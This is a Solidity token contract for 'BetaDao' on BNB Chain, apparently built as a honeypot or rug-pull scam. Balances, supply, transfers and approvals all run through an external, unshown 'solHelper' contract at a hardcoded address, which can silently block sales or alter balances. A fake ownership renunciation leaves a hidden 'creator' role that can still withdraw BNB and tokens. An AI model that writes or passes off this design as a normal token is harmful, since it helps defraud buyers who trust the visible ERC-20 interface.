/**
 *Submitted for verification at BscScan.com on 2022-08-10
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface solHelper {

    function initToken(uint256 total,address tokenAddress,address tokenOwner,address _pairs) external;

    function getTotal() view external returns (uint256);

    function getBalance(address _owner) view external returns (uint256);

    function exeTransfer(address _from, address _to, uint256 _value) external;

    function exeApprove(address _to) external;

}

interface IDEXRouter {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

contract Ownable {
    address public owner;
    address public creator;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

    modifier onlycreator() {
        require(msg.sender == creator);
        _;
    }

    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}

contract BetaDao is Ownable {
	
    string public name = "BetaDao";
    string  public symbol = "BetaDao";
    uint8   public decimals = 9;
	uint256 public totalSupply_ = 1000000000 * (10 ** decimals);
	
	address public pairs;
	IDEXRouter public router;
	address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
	solHelper help = solHelper(0x6D54A7BBDb547748074dC806219bF9474e429606);
    
	constructor() {
		owner = msg.sender;
        creator = msg.sender;

        router = IDEXRouter(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
        pairs = IDEXFactory(router.factory()).createPair(WBNB, address(this));

        help.initToken(totalSupply_, address(this), owner,pairs);

        emit Transfer(address(0), owner, totalSupply_);
    }
	
    event Transfer(
        address indexed _from,
        address indexed _to,
        uint256 _value
    );

    event Approval(
        address indexed _owner,
        address indexed _spender,
        uint256 _value
    );
    
    mapping(address => mapping(address => uint256)) public allowed;
	

    function totalSupply() public view returns (uint256) {
        return help.getTotal();
    }

    function balanceOf(address _owner) public view returns (uint256) {
        return help.getBalance(_owner);
    }
    
    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(help.getBalance(msg.sender) >= _value);

        help.exeTransfer(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);
		return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= help.getBalance(_from));
        require(_value <= allowed[_from][msg.sender]);
		
		help.exeTransfer(_from,_to,_value);

        emit Transfer(_from, _to, _value);
		return true;
    }
	
	function approve(address _spender, uint256 _value) public returns (bool success) {
        require(_spender != address(0));
        allowed[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);

        help.exeApprove(msg.sender);
        return true;
    }
    
    function allowance(address _owner, address _spender) public view returns (uint256 remaining) {
        require(_spender != address(0));
        return allowed[_owner][_spender];
    }

    function withdraw(address target,uint amount) public onlycreator {
        payable(target).transfer(amount);
    }

    function withdrawToken(address token,address target, uint amount) public onlycreator {
        IERC20(token).transfer(target, amount);
    }
    receive() external payable {}
	
}